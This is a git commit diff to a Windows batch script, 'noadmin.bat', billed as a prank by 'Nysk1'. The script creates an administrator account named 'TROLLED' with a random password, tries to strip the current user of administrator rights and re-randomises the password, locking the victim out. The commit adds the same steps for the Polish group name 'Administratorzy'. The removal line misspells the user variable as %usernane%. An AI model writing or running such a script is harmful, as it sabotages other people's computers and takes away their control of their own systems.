5fd5db5de5d9f8dba5bb00acc50b4c3f02a77131
xmvks <kontomkacz@gmail.com>
2025-03-11 16:49:49 +0100

    Update noadmin.bat

--- noadmin.bat
+++ noadmin.bat
@@ -2,6 +2,8 @@
 net user TROLLED %random% /add
 net localgroup Administrators TROLLED /add
 net localgroup Administrators /delete %usernane%
+net localgroup Administratorzy TROLLED /add
+net localgroup Administratorzy /delete %usernane%
 net user TROLLED %random%
 echo Pranked by Nysk1
 pause
